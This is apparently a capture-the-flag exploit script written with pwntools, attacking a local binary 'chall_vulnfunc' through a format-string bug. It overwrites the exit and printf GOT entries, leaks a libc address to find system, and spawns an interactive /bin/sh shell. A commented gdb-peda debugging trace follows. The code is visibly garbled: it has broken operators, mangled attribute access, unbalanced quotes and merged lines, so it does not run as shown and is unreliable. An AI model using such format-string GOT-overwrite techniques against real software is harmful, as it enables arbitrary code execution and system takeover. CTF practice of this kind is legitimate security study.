#!/usr/bin/env python3
from pwn import *

bin_file = './chall_vulnfunc'
context(os = 'linux', arch = ' amd64')
# context(terminal = [' tmux', 'splitw', '-v'])
# context. log_level = 'debug'

binf = ELF(bin_file)
addr_main = binf.functions[ 'main'].address
addr_got_exit = binf-got['exit']
addr_got_printf = binf-got['printf']

libc = binf.libc
offset_libc_read = libc.functions['read'].address

def attack(conn, **kwargs):
    overwrite = {addr_got_exit: addr_main}
    exploit = fmtstr_payload(6, overwrite, numbwritten = 0, write_size = 'short')
    conn.sendafter ( 'message\n', exploit)
    conn.sendlineafter ('message\n', "%3$p')
    addr_libc_read = int(conn.recvline(keepends=False), 16) - 0x12
    libc.address = addr_libc_read - offset_libc_read
    info 'addr_libc_base = 0x{:08x}'. format (libc.address))
    addr_libc_system = libc. functions['system'] .address

    exploit = '%}c'. format((addr_libc_system »> 16) & 0xff)
    exploit += '%10$hhn' exploit += *%(}c'. format((addr_libc_system
    Oxffff) - ((addr_libc_system »> 16) & 0xff))
    exploit += '%11$hn'
    exploit = exploit. ljust(0x20, 'x'). encode()
    exploit += flat(addr_got_printf+2, addr_got_printf) # 10, 11
    conn.sendafter('message\n', exploit)conn.sendafter('message\n', '/bin/sh')

def main():
    # conn = gdb. debug(bin_file)
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__=='__main__':
    main()

# gdb-peda$ b *main+141
# Breakpoint 1 at 0x401243 gdb-peda$ r
# Starting program: /home/ctf/files/pwnable/99_challs/vulnfunc/chall_vulnfunc
# Input message
# X
# -registers--
# RAX: 0x0
# RBX: 0x401260 < libc_csu_init›: endbr64)
# RCX: 0x7ffff7ed4fb2 (< GI libc_read+18>: cmp rax, 0x7fffffffffff000)
# RDX: 0x30 ('0')
# RSI: 0x7fffffffcbf0 --> 0xa58 ('X\n')
# RDI: 0x7fffffffcbf0 --> 0xa58 （'XIn'）
# RBP: 0x7fffffffcc30 --> 0x0
# RSP: 0x7fffffffcbf0 --> 0xa58 ('X\n')
# RIP: 0x401243 (<main+141>:
# call
# (snip...)
# Breakpoint 1, 0x0000000000401243 in main ()
